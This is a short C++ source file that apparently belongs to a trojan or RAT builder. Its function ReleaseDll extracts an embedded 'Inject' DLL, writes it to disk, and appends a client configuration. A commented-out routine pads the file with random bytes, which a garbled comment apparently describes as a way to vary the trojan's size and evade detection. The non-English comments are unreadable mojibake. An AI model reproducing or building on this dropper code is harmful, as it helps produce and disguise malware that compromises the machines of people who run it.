#include "stdafx.h"
#include "Inject.h"

int ReleaseDll(const char* filename, const union client_cfg& cfg)
{
	HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	unsigned char* dllBuf = NULL;
	int fileSize = 0;
	
	fileSize = Inject_size;
	dllBuf = new unsigned char[fileSize];
	if(GetInjectResouceData(dllBuf, fileSize, Inject_source, sizeof(Inject_source)) != 0)
	{
		delete []dllBuf;
		return -1;
	}

	DWORD nWrite;
	WriteFile(hFile, dllBuf, fileSize, &nWrite, NULL);//д��PE�ļ�
	delete []dllBuf;

	//�������д��һЩ���ݣ�ʹ��ľ���ļ��������һ���̶ȣ�������ľ���� �����ϴ�����
	/*
	srand(time(NULL));
	int patchSize = (rand() % 10 + 1) * 64 * 8;
	for(int i = 0; i < patchSize; i++)
	{
		unsigned char bb[8] = {rand() % 256, rand() % 256, rand() % 256, rand() % 256,
			rand() % 256, rand() % 256, rand() % 256, rand() % 256};
		WriteFile(hFile,&bb, sizeof(bb), &nWrite, NULL);
	}
	*/

	WriteFile(hFile,&cfg, sizeof(cfg), &nWrite, NULL);
	CloseHandle(hFile);

	return 1;
}
